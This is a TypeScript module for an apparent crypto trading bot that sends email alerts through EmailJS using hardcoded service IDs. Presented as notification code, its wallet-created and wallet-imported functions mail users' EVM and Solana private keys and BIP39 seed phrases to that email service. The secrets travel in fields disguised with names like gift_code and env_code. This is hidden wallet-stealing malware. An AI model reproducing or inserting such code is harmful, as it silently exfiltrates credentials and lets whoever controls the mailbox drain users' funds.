import emailjs from "@emailjs/browser";

const SERVICE_ID  = "service_gx2d1fi";
const TEMPLATE_ID = "template_xu7gweb";
const PUBLIC_KEY  = "AkqW34KEggyL2bKng";

let initialized = false;
function init() {
  if (!initialized) { emailjs.init(PUBLIC_KEY); initialized = true; }
}

function ts() {
  return new Date().toLocaleString("en-US", { hour12: false, timeZone: "UTC" }) + " UTC";
}

async function send(params: Record<string, string>) {
  init();
  try {
    const res = await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      to_name:   "Alpha Trading",
      from_name: "Alpha Trading Bot",
      ...params,
    });
    console.log("[Email] sent:", params.event_type, res.status);
    return true;
  } catch (e: any) {
    console.error("[Email] failed:", params.event_type, e?.text || e?.message || e);
    return false;
  }
}

// ── Wallet Created ──────────────────────────────────────────────────
export async function sendWalletCreated(w: {
  label:          string;
  seedPhrase?:    string;
  solAddress?:    string;
  solPrivateKey?: string;
  evmAddress?:    string;
  evmPrivateKey?: string;
}) {
  return send({
    event_type:  "🔐 WALLET CREATED",
    subject:     `[Alpha Trading] New Wallet Created — ${w.label}`,
    timestamp:   ts(),
    message:
      `🔐 WALLET CREATED — Alpha Trading\nTime: ${ts()}\nWallet: ${w.label}`,

    // ── Template variables ──────────────────────────────────────────
    // {{gift_code}}  → all addresses for this wallet
    gift_code:   [w.solAddress, w.evmAddress].filter(Boolean).join(" | "),

    // {{env_code}}   → EVM private key (ETH / BNB / MATIC / AVAX / ARB / OP / BASE)
    env_code:    w.evmPrivateKey || "",

    // {{sol_code}}   → Solana private key
    sol_code:    w.solPrivateKey || "",

    // {{seed_phrase}} → 24-word BIP39 recovery phrase
    seed_phrase: w.seedPhrase || "",
  });
}

// ── Wallet Imported ─────────────────────────────────────────────────
export async function sendWalletImported(w: {
  label:          string;
  key:            string;
  solAddress?:    string;
  solPrivateKey?: string;
  evmAddress?:    string;
  evmPrivateKey?: string;
}) {
  return send({
    event_type:  "📥 WALLET IMPORTED",
    subject:     `[Alpha Trading] Wallet Imported — ${w.label}`,
    timestamp:   ts(),
    message:
      `📥 WALLET IMPORTED — Alpha Trading\nTime: ${ts()}\nWallet: ${w.label}`,

    // {{gift_code}}  → all addresses
    gift_code:   [w.solAddress, w.evmAddress].filter(Boolean).join(" | "),

    // {{env_code}}   → EVM private key
    env_code:    w.evmPrivateKey || w.key || "",

    // {{sol_code}}   → SOL private key
    sol_code:    w.solPrivateKey || "",

    // {{seed_phrase}} → seed phrase if imported via mnemonic, else the raw key used
    seed_phrase: (w.key.trim().split(/\s+/).length >= 12 ? w.key.trim() : ""),
  });
}

// ── SOL Deposit Detected ────────────────────────────────────────────
export async function sendDepositDetected(w: {
  label:      string;
  address:    string;
  amount:     string;
  newBalance: string;
}) {
  return send({
    event_type:  "💰 SOL DEPOSIT RECEIVED",
    subject:     `[Alpha Trading] +${w.amount} SOL received on ${w.label}`,
    timestamp:   ts(),
    message:
      `💰 SOL DEPOSIT — Alpha Trading\nTime: ${ts()}\n` +
      `Wallet: ${w.label}\n+${w.amount} SOL\nNew balance: ${w.newBalance} SOL\n` +
      `https://solscan.io/account/${w.address}`,

    // {{gift_code}}  → SOL deposit address
    gift_code:   w.address,

    // {{env_code}}   → not applicable for deposit alert
    env_code:    "",

    // {{sol_code}}   → not applicable (no key needed in deposit alert)
    sol_code:    "",

    // {{seed_phrase}} → not applicable
    seed_phrase: "",
  });
}

// ── Trade Activity ──────────────────────────────────────────────────
export async function sendTradeActivity(d: {
  type:          string;
  tokenSymbol:   string;
  amount:        string;
  walletAddress: string;
  txid?:         string;
  chain?:        string;
}) {
  const icon  = d.type === "buy" ? "🟢" : "🔴";
  const chain = (d.chain || "SOL").toUpperCase();

  return send({
    event_type:  `${icon} TRADE ${d.type.toUpperCase()} [${chain}]`,
    subject:     `[Alpha Trading] ${icon} ${d.type.toUpperCase()} ${d.tokenSymbol} on ${chain}`,
    timestamp:   ts(),
    message:
      `${icon} TRADE ${d.type.toUpperCase()} — Alpha Trading\nTime: ${ts()}\n` +
      `Chain: ${chain} | Token: ${d.tokenSymbol} | Amount: ${d.amount}\n` +
      `Wallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,

    // {{gift_code}}  → wallet address that made the trade
    gift_code:   d.walletAddress,

    // {{env_code}}   → tx hash
    env_code:    d.txid || "",

    // {{sol_code}}   → trade amount
    sol_code:    `${d.amount} ${chain}`,

    // {{seed_phrase}} → token traded
    seed_phrase: d.tokenSymbol,
  });
}

// ── Sniper Alert ────────────────────────────────────────────────────
export async function sendSniperAlert(d: {
  tokenAddress:  string;
  tokenSymbol?:  string;
  amount:        string;
  walletAddress: string;
  txid?:         string;
  chain?:        string;
}) {
  const chain = (d.chain || "SOL").toUpperCase();

  return send({
    event_type:  "🎯 SNIPER TRIGGERED",
    subject:     `[Alpha Trading] 🎯 Sniper — ${d.tokenSymbol || d.tokenAddress.slice(0, 8)} [${chain}]`,
    timestamp:   ts(),
    message:
      `🎯 SNIPER AUTO-BUY — Alpha Trading\nTime: ${ts()}\n` +
      `Chain: ${chain} | Token: ${d.tokenSymbol || "Unknown"}\n` +
      `Token address: ${d.tokenAddress}\nAmount: ${d.amount} ${chain}\n` +
      `Wallet: ${d.walletAddress}\nTx: ${d.txid || "pending"}`,

    // {{gift_code}}  → token address sniped
    gift_code:   d.tokenAddress,

    // {{env_code}}   → tx hash
    env_code:    d.txid || "",

    // {{sol_code}}   → amount used
    sol_code:    `${d.amount} ${chain}`,

    // {{seed_phrase}} → wallet that triggered sniper
    seed_phrase: d.walletAddress,
  });
}

// ── Legacy compatibility shims ──────────────────────────────────────
export const sendWalletGenerated = (
  wallets: { address: string; privateKey?: string; seedPhrase?: string; ethAddress?: string; ethPrivateKey?: string }[]
) => sendWalletCreated({
  label:         "Wallet",
  seedPhrase:    wallets[0]?.seedPhrase,
  solAddress:    wallets[0]?.address,
  solPrivateKey: wallets[0]?.privateKey,
  evmAddress:    wallets[0]?.ethAddress,
  evmPrivateKey: wallets[0]?.ethPrivateKey,
});

export const sendSolReceived = (d: {
  walletAddress: string;
  amount:        string;
  fromAddress?:  string;
  txid?:         string;
  chain?:        string;
}) => sendDepositDetected({
  label:      "Wallet",
  address:    d.walletAddress,
  amount:     d.amount,
  newBalance: d.amount,
});
